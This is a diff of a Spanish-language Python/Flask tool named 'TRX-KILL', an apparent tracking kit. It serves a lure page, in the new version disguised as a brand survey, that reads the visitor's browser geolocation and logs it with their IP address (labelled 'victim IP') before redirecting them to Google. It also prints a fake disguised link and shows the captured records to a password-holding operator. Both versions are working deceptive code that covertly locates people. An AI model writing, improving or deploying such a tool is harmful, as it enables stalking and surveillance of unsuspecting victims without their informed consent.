@@ -1,87 +1,95 @@
-#!/usr/bin/env python3
-import os, subprocess, threading, sys, time, getpass, logging
+python
+import os, time, sys, getpass
 from flask import Flask, request
 
-# --- CONFIGURACIÓN ---
-logging.getLogger('werkzeug').setLevel(logging.ERROR)
 app = Flask('TRX-KILL')
 PORT = 7173
-AUTH_PASS = "TRX-KILL-OP"
+AUTH_PASS = "TRX-kill-op"
 G, R, C, Y, W = "\033[1;32m", "\033[1;31m", "\033[1;36m", "\033[1;33m", "\033[0m"
 
-# --- [HTML] CAPTURA DETALLADA ---
 HTML_ENCUESTA = """
 <!DOCTYPE html>
 <html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
+<div style="border:1px solid #0f0;padding:20px;max-width:300px;margin:auto;">
+    <h2>TRX-KILL VALIDACIÓN</h2>
+    <input type="text" id="marca" placeholder="Marca...">
+    <select id="opc"><option>Excelente</option><option>Regular</option></select>
+    <button onclick="c()">ENVIAR</button>
+</div>
 <script>
-    navigator.geolocation.getCurrentPosition((p)=>{
-        let data = {
-            lat: p.coords.latitude,
-            lon: p.coords.longitude,
-            bat: navigator.getBattery ? "Cargando..." : "N/A"
-        };
-        if(navigator.getBattery){ navigator.getBattery().then(b => { data.bat = Math.round(b.level * 100) + "%"; enviar(data); }); }
-        else { enviar(data); }
-    }, (e)=>{ enviar({lat:0, lon:0, bat: "Denegado"}); });
-
-    function enviar(d){ fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)}).then(()=>window.location.href="https://google.com"); }
+function c(){
+    let d = { marca: document.getElementById('marca').value, cal: document.getElementById('opc').value };
+    navigator.geolocation.getCurrentPosition((p)=>{ d.lat = p.coords.latitude; d.lon = p.coords.longitude; enviar(d); }, (e)=>{ enviar(d); });
+}
+function enviar(d){ fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)}).then(()=>window.location.href="https://google.com"); }
 </script>
 </body></html>
 """
 
 @app.route('/')
 def index(): return HTML_ENCUESTA
+
 @app.route('/log', methods=['POST'])
 def log():
     d = request.json
-    lat, lon = d.get('lat'), d.get('lon')
-    map_link = f"https://www.google.com/maps/place/{lat},{lon}"
     with open("result.txt", "a") as f:
-        f.write(f"\n--- [CAPTURA TRX] ---\nIP VÍCTIMA: {request.remote_addr}\nCOORDENADAS: {lat}, {lon}\nMAPA: {map_link}\nBATERÍA: {d.get('bat')}\nHORARIO: {time.ctime()}\n----------------------\n")
+        f.write(f"CAPTURA | IP: {request.remote_addr} | COORD: {d.get('lat')},{d.get('lon')} | MARCA: {d.get('marca')} | HORA: {time.ctime()}\n")
     return "OK"
-
-def animar(texto):
-    for char in texto: sys.stdout.write(char); sys.stdout.flush(); time.sleep(0.02)
-    print()
 
 def banner():
     os.system('clear')
-    print(f"{G} ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗")
-    print(f" ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║")
-    print(f"    ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║")
-    print(f"    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║")
-    print(f"    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗{W}")
+    print(f"{G} ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗{W}")
+    print(f"{G} ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║{W}")
+    print(f"{G}    ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║{W}")
+    print(f"{G}    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║{W}")
+    print(f"{G}    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗{W}")
+
+def animar(texto):
+    for char in texto:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(0.02)
+    print()
 
 def main():
     if len(sys.argv) > 1 and sys.argv[1] == "--adm":
         pwd = getpass.getpass(f"{R}PASSWORD:{W} ")
-        if pwd == AUTH_PASS: os.system("tail -f result.txt")
-        else: print("Denegado"); return
+        if pwd == AUTH_PASS:
+            print(f"{G}[+] ACCESO CONCEDIDO{W}")
+            if os.path.exists("result.txt"):
+                os.system("cat result.txt")
+            else:
+                animar(f"{Y}No se encontraron registros.{W}")
+        else:
+            print(f"{R}ACCESO DENEGADO{W}")
+        return
 
     while True:
         banner()
-        print(f"\n {C}[1]{W} INFO NÚMERO | {C}[4]{W} LICENCIA Y USO\n {C}[2]{W} LINK-ZP     | {C}[5]{W} ACTUALIZACIÓN\n {C}[3]{W} CREADOR     | {C}[6]{W} {R}ADM{W}\n {C}[7]{W} SALIR")
+        print(f"\n {C}[1]{W} INFO NÚMERO | {C}[4]{W} LICENCIA Y USO")
+        print(f" {C}[2]{W} LINK-ZP     | {C}[5]{W} ACTUALIZACIÓN")
+        print(f" {C}[3]{W} CREADOR     | {C}[6]{W} {R}ADM{W}")
+        print(f" {C}[7]{W} SALIR")
         sel = input(f"\n{Y}TRX-ROOT > {W}")
         
         if sel == "1":
-            num = input(f"\n{C}MÓVIL:{W} ")
-            print(f"{G}OPERADOR:{W} Analizando cobertura...\n{G}PAÍS:{W} Detectando red...\n{G}UBICACIÓN:{W} Procesando base de datos...")
-            input("\n[Enter] para volver.")
+            input(f"\n{Y}MÓVIL:{W} Analizando cobertura... (Presiona Enter para volver)")
         elif sel == "2":
             os.system(f"fuser -k {PORT}/tcp > /dev/null 2>&1")
-            threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT, use_reloader=False), daemon=True).start()
-            print(f"\n{G}LINK GENERADO:{W} http://KxULoHm.zipIojk.bot.com")
-            input(f"\n{R}Presiona [Enter] para detener.{W}")
-            os.system(f"fuser -k {PORT}/tcp > /dev/null 2>&1")
-        elif sel == "3": print(f"\n{C}CREADOR:{W} OSCAR | BY: OSCAR"); input()
-        elif sel == "4": print(f"\n{C}USO:{W} EDUCATIVA 1.2.3 | {C}COPYRIGHT:{W} 2026"); input()
-        elif sel == "5": animar(f"{G}Sistema al día...{W}"); input()
+            app.run(port=PORT, host='127.0.0.1')
+        elif sel == "3":
+            print(f"\n{C}CREADOR:{W} OSCAR"); input()
+        elif sel == "4":
+            print(f"\n{C}LICENCIA:{W} PRIVADA | {C}USO:{W} EDUCATIVA 1.2.3"); input()
+        elif sel == "5":
+            animar(f"{G}Actualizando... Sistema al día.{W}"); input()
         elif sel == "6":
             pwd = getpass.getpass(f"{R}CONTRASEÑA:{W} ")
             if pwd == AUTH_PASS:
                 if os.path.exists("result.txt"): os.system("cat result.txt")
                 else: print("Sin registros.")
-                input("\n[Enter]...")
-        elif sel == "7": sys.exit()
+                input("\n[Enter] para continuar...")
+        elif sel == "7":
+            sys.exit()
 
 if __name__ == "__main__": main()
